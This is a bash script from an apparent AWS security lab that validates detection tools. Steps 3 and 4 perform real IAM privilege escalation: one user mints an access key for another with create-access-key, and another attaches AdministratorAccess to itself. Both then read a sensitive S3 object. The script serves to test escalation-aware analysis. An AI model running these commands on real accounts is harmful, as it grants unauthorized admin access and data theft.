#!/bin/bash

# Demo script for test-reverse-blast-radius-escalation
# This is a detection-validation demo. Unlike the sibling read-only labs, it DOES
# perform real privilege escalation and therefore MUST be cleaned up afterward
# (run ./cleanup_attack.sh).
#
# It proves the "including privilege escalations" form of reverse blast radius:
# principals that cannot read the bucket today but can grant themselves the
# ability to. An escalation-aware "who can reach this bucket" answer must return
# all three; a direct-only answer returns only bucket-reader.
#
#   bucket-reader     reads the bucket directly                              (direct)
#   cak-user          iam:CreateAccessKey on bucket-reader -> act as it      (escalate)
#   attach-self-user  iam:AttachUserPolicy on self -> attach admin -> read   (escalate)

# Disable AWS CLI paging
export AWS_PAGER=""

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Dim color for command display
DIM='\033[2m'
CYAN='\033[0;36m'

# Track attack commands for summary
ATTACK_COMMANDS=()

show_cmd() {
    local identity="$1"; shift
    echo -e "${DIM}[${identity}] \$ $*${NC}"
}

show_attack_cmd() {
    local identity="$1"; shift
    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
    ATTACK_COMMANDS+=("$*")
}

# Configuration (user names from main.tf)
BUCKET_READER_NAME="pl-prod-rbr-esc-bucket-reader"
CAK_USER_NAME="pl-prod-rbr-esc-cak-user"
ATTACH_SELF_USER_NAME="pl-prod-rbr-esc-attach-self-user"
ADMIN_POLICY_ARN="arn:aws:iam::aws:policy/AdministratorAccess"

# Number of observed results that differ from the expected ground truth
MISMATCHES=0

# Matrix rows: "principal|mechanism|can_read"
MATRIX_ROWS=()

echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}Reverse Blast Radius: Escalation-Aware Demo${NC}"
echo -e "${GREEN}========================================${NC}\n"

echo -e "${BLUE}This scenario tests escalation-aware reverse blast radius:${NC}"
echo "- bucket-reader     reads the bucket directly                        (direct)"
echo "- cak-user          mints keys for bucket-reader, then reads as it   (escalate)"
echo "- attach-self-user  attaches AdministratorAccess to itself, reads    (escalate)"
echo ""
echo -e "${RED}⚠ This demo performs REAL privilege escalation. Run ./cleanup_attack.sh after.${NC}"
echo ""

# Check required tools
if ! command -v aws &> /dev/null; then
    echo -e "${RED}Error: AWS CLI is not installed or not in PATH${NC}"
    exit 1
fi
if ! command -v jq &> /dev/null; then
    echo -e "${RED}Error: jq is not installed or not in PATH${NC}"
    exit 1
fi

# Step 1: Retrieve credentials and region from Terraform grouped outputs
echo -e "${YELLOW}Step 1: Retrieving scenario configuration from Terraform${NC}"
cd ../../../..  # Navigate to root of terraform project

MODULE_OUTPUT=$(terraform output -json 2>/dev/null | jq -r '.tool_testing_test_reverse_blast_radius_escalation.value // empty')

if [ -z "$MODULE_OUTPUT" ]; then
    echo -e "${RED}Error: Could not find terraform output${NC}"
    echo "Make sure you've deployed this scenario with: terraform apply"
    exit 1
fi

BUCKET_READER_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.bucket_reader_access_key_id')
BUCKET_READER_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.bucket_reader_secret_access_key')
CAK_USER_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.cak_user_access_key_id')
CAK_USER_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.cak_user_secret_access_key')
ATTACH_SELF_USER_ACCESS_KEY_ID=$(echo "$MODULE_OUTPUT" | jq -r '.attach_self_user_access_key_id')
ATTACH_SELF_USER_SECRET_ACCESS_KEY=$(echo "$MODULE_OUTPUT" | jq -r '.attach_self_user_secret_access_key')
BUCKET_NAME=$(echo "$MODULE_OUTPUT" | jq -r '.bucket_name')

for REQUIRED_VALUE in "$BUCKET_READER_ACCESS_KEY_ID" "$CAK_USER_ACCESS_KEY_ID" \
    "$ATTACH_SELF_USER_ACCESS_KEY_ID" "$BUCKET_NAME"; do
    if [ "$REQUIRED_VALUE" == "null" ] || [ -z "$REQUIRED_VALUE" ]; then
        echo -e "${RED}Error: Could not extract all required values from terraform output${NC}"
        exit 1
    fi
done

AWS_REGION=$(terraform output -raw aws_region 2>/dev/null || echo "")
if [ -z "$AWS_REGION" ]; then
    echo -e "${YELLOW}Warning: Could not retrieve region from Terraform, defaulting to us-east-1${NC}"
    AWS_REGION="us-east-1"
fi

echo "Retrieved access keys for 3 candidate users:"
echo "  - bucket-reader:    (${BUCKET_READER_ACCESS_KEY_ID:0:10}...)"
echo "  - cak-user:         (${CAK_USER_ACCESS_KEY_ID:0:10}...)"
echo "  - attach-self-user: (${ATTACH_SELF_USER_ACCESS_KEY_ID:0:10}...)"
echo "  - target bucket: $BUCKET_NAME"
echo "  - region:        $AWS_REGION"
echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"

# Navigate back to scenario directory
cd - > /dev/null

# Source demo permissions library (no-op: scenario declares no helpful permissions)
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
source "$SCRIPT_DIR/../../../../scripts/lib/demo_permissions.sh"
restrict_helpful_permissions "$SCRIPT_DIR/scenario.yaml"
setup_demo_restriction_trap "$SCRIPT_DIR/scenario.yaml"

# Set caller credentials for one of the candidate users
set_caller_creds() {
    export AWS_ACCESS_KEY_ID="$1"
    export AWS_SECRET_ACCESS_KEY="$2"
    unset AWS_SESSION_TOKEN
    export AWS_REGION=$AWS_REGION
}

verify_identity() {
    local expected_name="$1"
    show_cmd "$expected_name" "aws sts get-caller-identity --query 'Arn' --output text --region $AWS_REGION"
    local arn
    arn=$(aws sts get-caller-identity --query 'Arn' --output text --region "$AWS_REGION")
    echo "Current identity: $arn"
    if [[ ! "$arn" == *"$expected_name"* ]]; then
        echo -e "${RED}Error: Not running as $expected_name${NC}"
        exit 1
    fi
    echo -e "${GREEN}✓ Verified identity${NC}"
}

# Classify a command's result as allowed/denied/error and compare to expectation.
check_result() {
    local expectation="$1"; shift
    local description="$1"; shift
    local output rc
    output=$("$@" 2>&1); rc=$?

    if [ $rc -eq 0 ]; then
        LAST_RESULT="allowed"
    elif echo "$output" | grep -qiE "AccessDenied|Access Denied|not authorized|Forbidden|403"; then
        LAST_RESULT="denied"
    else
        LAST_RESULT="error"
        echo -e "${RED}  Unexpected non-authorization error: $output${NC}"
    fi

    if { [ "$expectation" == "allow" ] && [ "$LAST_RESULT" == "allowed" ]; } || \
       { [ "$expectation" == "deny" ] && [ "$LAST_RESULT" == "denied" ]; }; then
        if [ "$LAST_RESULT" == "allowed" ]; then
            echo -e "  ${GREEN}✓ $description: ALLOWED (expected)${NC}"
        else
            echo -e "  ${GREEN}✓ $description: ACCESS DENIED (expected)${NC}"
        fi
    else
        echo -e "  ${RED}✗ $description: observed ${LAST_RESULT}, expected ${expectation}${NC}"
        MISMATCHES=$((MISMATCHES + 1))
    fi
}

# =============================================================================
# Step 2: bucket-reader reads the bucket directly (the escalation target)
# =============================================================================
echo -e "${YELLOW}Step 2: bucket-reader reads the bucket DIRECTLY${NC}"
set_caller_creds "$BUCKET_READER_ACCESS_KEY_ID" "$BUCKET_READER_SECRET_ACCESS_KEY"
verify_identity "$BUCKET_READER_NAME"

show_attack_cmd "bucket-reader" "aws s3api get-object --region $AWS_REGION --bucket $BUCKET_NAME --key sensitive-data.txt /dev/null"
check_result allow "bucket-reader direct read" \
    aws s3api get-object --region "$AWS_REGION" --bucket "$BUCKET_NAME" --key "sensitive-data.txt" /dev/null
MATRIX_ROWS+=("bucket-reader|direct|$LAST_RESULT")
echo ""

# =============================================================================
# Step 3: cak-user escalates via iam:CreateAccessKey on bucket-reader
# =============================================================================
echo -e "${YELLOW}Step 3: cak-user mints an access key for bucket-reader, then reads as it${NC}"
set_caller_creds "$CAK_USER_ACCESS_KEY_ID" "$CAK_USER_SECRET_ACCESS_KEY"
verify_identity "$CAK_USER_NAME"

show_attack_cmd "cak-user" "aws iam create-access-key --user-name $BUCKET_READER_NAME --region $AWS_REGION"
CAK_OUTPUT=$(aws iam create-access-key --user-name "$BUCKET_READER_NAME" --region "$AWS_REGION" --output json 2>&1)
CAK_RC=$?
MINTED_ACCESS_KEY_ID=""
if [ $CAK_RC -eq 0 ]; then
    echo -e "  ${GREEN}✓ cak-user create-access-key on bucket-reader: ALLOWED (expected)${NC}"
    MINTED_ACCESS_KEY_ID=$(echo "$CAK_OUTPUT" | jq -r '.AccessKey.AccessKeyId')
    MINTED_SECRET_ACCESS_KEY=$(echo "$CAK_OUTPUT" | jq -r '.AccessKey.SecretAccessKey')
    echo "  Minted access key for bucket-reader: $MINTED_ACCESS_KEY_ID"
    # Record for cleanup convenience (cleanup also discovers this defensively)
    echo "$MINTED_ACCESS_KEY_ID" > "$SCRIPT_DIR/.minted_bucket_reader_key"
else
    echo -e "  ${RED}✗ cak-user create-access-key on bucket-reader: observed failure, expected ALLOWED${NC}"
    echo -e "  ${RED}$CAK_OUTPUT${NC}"
    MISMATCHES=$((MISMATCHES + 1))
fi

if [ -n "$MINTED_ACCESS_KEY_ID" ]; then
    echo -e "${YELLOW}Waiting 15 seconds for the new access key to propagate...${NC}"
    sleep 15

    set_caller_creds "$MINTED_ACCESS_KEY_ID" "$MINTED_SECRET_ACCESS_KEY"
    show_attack_cmd "bucket-reader (minted key)" "aws s3api get-object --region $AWS_REGION --bucket $BUCKET_NAME --key sensitive-data.txt /dev/null"
    check_result allow "cak-user read (as bucket-reader via minted key)" \
        aws s3api get-object --region "$AWS_REGION" --bucket "$BUCKET_NAME" --key "sensitive-data.txt" /dev/null
    MATRIX_ROWS+=("cak-user|iam:CreateAccessKey|$LAST_RESULT")
else
    MATRIX_ROWS+=("cak-user|iam:CreateAccessKey|error")
fi
echo ""

# =============================================================================
# Step 4: attach-self-user escalates via iam:AttachUserPolicy on itself
# =============================================================================
echo -e "${YELLOW}Step 4: attach-self-user attaches AdministratorAccess to itself, then reads${NC}"
set_caller_creds "$ATTACH_SELF_USER_ACCESS_KEY_ID" "$ATTACH_SELF_USER_SECRET_ACCESS_KEY"
verify_identity "$ATTACH_SELF_USER_NAME"

show_attack_cmd "attach-self-user" "aws iam attach-user-policy --user-name $ATTACH_SELF_USER_NAME --policy-arn $ADMIN_POLICY_ARN --region $AWS_REGION"
ATTACH_OUTPUT=$(aws iam attach-user-policy \
    --user-name "$ATTACH_SELF_USER_NAME" \
    --policy-arn "$ADMIN_POLICY_ARN" \
    --region "$AWS_REGION" 2>&1)
ATTACH_RC=$?
if [ $ATTACH_RC -eq 0 ]; then
    echo -e "  ${GREEN}✓ attach-self-user attach-user-policy (AdministratorAccess): ALLOWED (expected)${NC}"

    echo -e "${YELLOW}Waiting 15 seconds for the attached policy to propagate...${NC}"
    sleep 15

    show_attack_cmd "attach-self-user (now admin)" "aws s3api get-object --region $AWS_REGION --bucket $BUCKET_NAME --key sensitive-data.txt /dev/null"
    check_result allow "attach-self-user read (now admin)" \
        aws s3api get-object --region "$AWS_REGION" --bucket "$BUCKET_NAME" --key "sensitive-data.txt" /dev/null
    MATRIX_ROWS+=("attach-self-user|iam:AttachUserPolicy|$LAST_RESULT")
else
    echo -e "  ${RED}✗ attach-self-user attach-user-policy: observed failure, expected ALLOWED${NC}"
    echo -e "  ${RED}$ATTACH_OUTPUT${NC}"
    MISMATCHES=$((MISMATCHES + 1))
    MATRIX_ROWS+=("attach-self-user|iam:AttachUserPolicy|error")
fi
echo ""

# Restore helpful permissions before printing the summary (no-op)
restore_helpful_permissions "$SCRIPT_DIR/scenario.yaml"

# =============================================================================
# Observed matrix
# =============================================================================
echo -e "\n${GREEN}========================================${NC}"
echo -e "${GREEN}Observed Read Matrix for bucket: $BUCKET_NAME${NC}"
echo -e "${GREEN}========================================${NC}"
printf "  %-20s %-24s %-10s\n" "PRINCIPAL" "MECHANISM" "CAN_READ"
for ROW in "${MATRIX_ROWS[@]}"; do
    IFS='|' read -r ROW_PRINCIPAL ROW_MECH ROW_READ <<< "$ROW"
    printf "  %-20s %-24s %-10s\n" "$ROW_PRINCIPAL" "$ROW_MECH" "$ROW_READ"
done
echo ""

echo -e "${YELLOW}Expected results (compare your graph tool against these):${NC}"
echo "  direct reader               = bucket-reader"
echo "  reachable via escalation too = cak-user, attach-self-user"
echo ""
echo -e "${RED}⚠ cak-user and attach-self-user have NO S3 permission of their own.${NC}"
echo "  A direct-only reverse blast radius answer returns only bucket-reader."
echo "  An escalation-aware answer must also return cak-user (iam:CreateAccessKey)"
echo "  and attach-self-user (iam:AttachUserPolicy on self)."
echo ""

if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
    echo -e "${YELLOW}Commands Executed:${NC}"
    for cmd in "${ATTACK_COMMANDS[@]}"; do
        echo -e "  ${CYAN}\$ ${cmd}${NC}"
    done
    echo ""
fi

echo -e "${YELLOW}MITRE ATT&CK Mapping:${NC}"
echo "  - T1098.001: Account Manipulation: Additional Cloud Credentials"
echo "  - T1530: Data from Cloud Storage Object"
echo ""
echo -e "${YELLOW}Artifacts created by this demo (removed by cleanup_attack.sh):${NC}"
echo "  - A second access key on $BUCKET_READER_NAME"
echo "  - AdministratorAccess attached to $ATTACH_SELF_USER_NAME"
echo -e "${RED}⚠ Run ./cleanup_attack.sh to revert these escalations.${NC}"
echo ""

if [ "$MISMATCHES" -ne 0 ]; then
    echo -e "${RED}✗ $MISMATCHES observed result(s) differed from the expected ground truth${NC}"
    touch "$(dirname "$0")/.demo_active"
    exit 1
fi

echo -e "${GREEN}✅ All observed results match the expected ground truth${NC}"
echo ""

# Mark demo as active for plabs tracking
touch "$(dirname "$0")/.demo_active"
